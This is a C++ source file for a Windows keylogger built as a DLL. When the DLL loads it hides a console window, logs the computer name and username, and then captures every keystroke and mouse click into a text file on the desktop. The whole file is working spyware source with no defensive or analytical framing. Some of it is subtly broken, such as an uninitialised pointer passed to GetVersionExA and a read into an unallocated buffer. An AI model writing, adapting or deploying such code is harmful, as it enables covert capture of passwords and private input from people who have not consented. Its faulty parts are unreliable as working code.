/**
 * RUBEN WIHLER
 * 08.06.2023
*/

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <string>

#pragma comment(lib, "user32.lib")

using namespace std;

const char *log_file = "C:\\Users\\Admin\\Desktop\\log.txt";
// long unsigned int iSessionCharacterNumber = 0;

void hideConsole();
void writeStartupInfo();
void writeShutdownInfo();
void startLogging();
// char* getImportantText();

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID LpReserved)
{
    if (dwReason != DLL_PROCESS_ATTACH) return TRUE;

    hideConsole();
    // writeShutdownInfo();
    writeStartupInfo();
    startLogging();
    
    return TRUE;
}

void hideConsole()
{
    HWND hConsole;
    AllocConsole();
    hConsole=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(hConsole,0);
}

void startLogging()
{
    char character;
    
    for(;;)
    {
        for(character=8;character<=222;character++)
        {
            if(GetAsyncKeyState(character)==-32767)
            {
                ofstream write(log_file, ios::app);
                bool bShiftEnable = (GetAsyncKeyState(0x10) != 0);
                POINT pCursorPosition;
                GetCursorPos(&pCursorPosition);
            
                if(((character>64)&&(character<91))&&!(bShiftEnable))
                {
                    character+=32;
                    write<<character;
                    write.close();
                    break;
                }
                else if((character>64)&&(character<91))
                {
                    write<<character;
                    write.close();
                    break;
                }
                else 
                {
                    switch (character)
                    {
                        case VK_UP:
                            write<<"\n<UP>\n";
                            break;
                        case VK_DOWN:
                            write<<"\n<DOWN>\n";
                            break;
                        case VK_LEFT:
                            write<<"\n<LEFT>\n";
                            break;
                        case VK_RIGHT:
                            write<<"\n<RIGHT>\n";
                            break;
                        case 0x01:
                            write<<"\n<LEFT-CLICK ("<<pCursorPosition.x<<","<<pCursorPosition.y<<")>\n";
                            break;
                        case 0x02:
                            write<<"\n<RIGHT-CLICK ("<<pCursorPosition.x<<","<<pCursorPosition.y<<")>\n";
                            break;
                        case 0x03:
                            write<<"\n<CANCEL>\n";
                            break;
                        case 0x04:
                            write<<"\n<MIDDLE-CLICK ("<<pCursorPosition.x<<","<<pCursorPosition.y<<")>\n";
                            break;
                        case 0x10:
                            break;
                        case 0x11:
                            write<<" CTRL ";
                            break;
                        case 0x12:
                            write<<" ALT ";
                            break;
                        case 0x13:
                            write<<" PAUSE ";
                            break;
                        case 0x14:
                            write<<" CAPS LOCK ";
                            break;
                        case 0x1B:
                            write<<"\n<ESC>\n";
                            break;
                        case 0x1C:
                            write<<"\n<END>\n";
                            break;
                        case 0x1D:
                            write<<"\n<HOME>\n";
                            break;
                        case 0x1E:
                            write<<"\n<INSERT>\n";
                            break;
                        case 0x1F:
                            write<<"\n<DEL>\n";
                            break;
                        case 0x21:
                            write<<"\n<PAGE UP>\n";
                            break;
                        case 0x22:
                            write<<"\n<PAGE DOWN>\n";
                            break;
                        case 0x23:
                            write<<"\n<END>\n";
                            break;
                        case 0x24:
                            write<<"\n<HOME>\n";
                            break;
                        case 0x29:
                            write<<"\n<IME SELECT>\n";
                            break;

                        case 48:
                        {
                            if(bShiftEnable)
                                write<<")";
                            else
                                write<<"0";    
                        }   
                        break;

                        case 49:
                        {
                            if(bShiftEnable)
                                write<<"!";
                            else
                                write<<"1";    
                        }   
                        break;

                        case 50:
                        {
                            if(bShiftEnable)
                                write<<"@";
                            else
                                write<<"2";    
                        }
                        break;
                        
                        case 51:
                        {
                            if(bShiftEnable)
                                write<<"#";
                            else
                                write<<"3";    
                        }   
                        break;

                        case 52:
                        {
                            if(bShiftEnable)
                                write<<"$";
                            else
                                write<<"4";    
                        }
                        break;  
                        
                        case 53:
                        {
                            if(bShiftEnable)
                                write<<"%";
                            else
                                write<<"5";    
                        }   
                        break;

                        case 54:
                        {
                            if(bShiftEnable)
                                write<<"^";
                            else
                                write<<"6";    
                        }
                        break;
                        
                        case 55:
                        {
                            if(bShiftEnable)
                                write<<"&";
                            else
                                write<<"7";    
                        }   
                        break;
                        
                        case 56:
                        {
                            if(bShiftEnable)
                                write<<"*";
                            else
                                write<<"8";    
                        }   
                        break;
                        
                        case 57:
                        {
                            if(bShiftEnable)
                                write<<"(";
                            else
                                write<<"9";    
                        }   
                        break;

                        case VK_SPACE:
                            write<<" ";
                            break;
                        case VK_RETURN:
                            write<<"\n";
                            break;  
                        case VK_TAB:
                            write<<"  ";
                            break;
                       case VK_BACK:
                            write<<"\n<BACKSPACE>\n";
                            break;
                        case VK_DELETE:
                            write<<"\n<Del>\n";
                            break;
                        case VK_OEM_1:
                            write<<" ;:";
                            break;
                        case VK_OEM_2:
                            write<<" /?";
                            break;
                        case VK_OEM_3:
                            write<<"`~";
                            break;
                        case VK_OEM_4:
                            write<<" [{";
                            break;
                        case VK_OEM_5:
                            write<<" \\|";
                            break;
                        case VK_OEM_6:
                            write<<" ]}";
                            break;
                        case VK_OEM_7:
                            write<<" ' \"";
                            break;
                        case VK_OEM_PLUS:
                            write<<" +=";
                            break;
                        case VK_OEM_COMMA:
                            write<<" ,<";
                            break;
                        case VK_OEM_MINUS:
                            write<<" -_";
                            break;
                        case VK_OEM_PERIOD:
                            write<<" .>";
                            break;
                        case VK_NUMPAD0:
                            write<<"0";
                            break;
                        case VK_NUMPAD1:
                            write<<"1";
                            break;
                        case VK_NUMPAD2:
                            write<<"2";
                            break;
                        case VK_NUMPAD3:
                            write<<"3";
                            break;
                        case VK_NUMPAD4:
                            write<<"4";
                            break;
                        case VK_NUMPAD5:
                            write<<"5";
                            break;
                        case VK_NUMPAD6:
                            write<<"6";
                            break;
                        case VK_NUMPAD7:
                            write<<"7";
                            break;
                        case VK_NUMPAD8:
                            write<<"8";
                            break;
                        case VK_NUMPAD9:
                            write<<"9";
                            break;

                        default:
                            write<<character; 
                    }
                }
           }
        }
    }
}

void writeStartupInfo(){
    ofstream write(log_file, ios::app);

    LPOSVERSIONINFOA lpVersionInformation;
    GetVersionExA(lpVersionInformation);
    
    write<<" -------- session started -------- \n";
    write<<"Computer Name: "<<getenv("COMPUTERNAME")<<endl;
    write<<"OS: "<<lpVersionInformation->dwMajorVersion<<endl;
    write<<"User: "<<getenv("USERNAME")<<endl;
    write<<"Date: "<<__DATE__<<endl;
    write<<"Time: "<<__TIME__<<endl;
    
    write.close();

    // ifstream read(log_file);
    // read.seekg(0, ios::end);
    // iSessionCharacterNumber = read.tellg();
    // read.close();
}

void writeShutdownInfo(){
    /*
    char* important_text = getImportantText();

    ofstream write(log_file, ios::app);
    write<<" -------- session ended -------- \n";
    write<<"Important text: \n\n"<<important_text<<endl;
    write<<" ------------------------------- \n";
    write.close();
    */
}

/*
char* getImportantText(){
    //read last 1024 characters of log file
    char* buffer;
    ifstream read(log_file);
    read.seekg(0,std::ios_base::end);
    read.read(buffer, 2048);
    read.close();

    //convert buffer into a string
    string s(buffer);
    string delimiter = "-------------------------------";
    string token = s.substr(0, s.find(delimiter));

    //filter 
    //remove all iteration of "<UP>"
    char* filters[] = 
    {
        "\n<UP>\n",
        "\n<DOWN>\n", 
        "\n<LEFT>\n", 
        "\n<RIGHT>\n", 
        "\n<ESC>\n", 
        "\n<END>\n", 
        "\n<HOME>\n", 
        "\n<INSERT>\n", 
        "\n<DEL>\n", 
        "\n<PAGE UP>\n", 
        "\n<PAGE DOWN>\n", 
        "\n<END>\n", 
        "\n<HOME>\n", 
        "\n<IME SELECT>\n"
    };

    for (auto i: filters)
    {
        // remove all occurences of i
        char* pch = strstr(buffer, i);
        while (pch != NULL)
        {
            memcpy(pch, "", strlen(i));
            pch = strstr(buffer, i);
        }
    }
    
    return buffer;
}
*/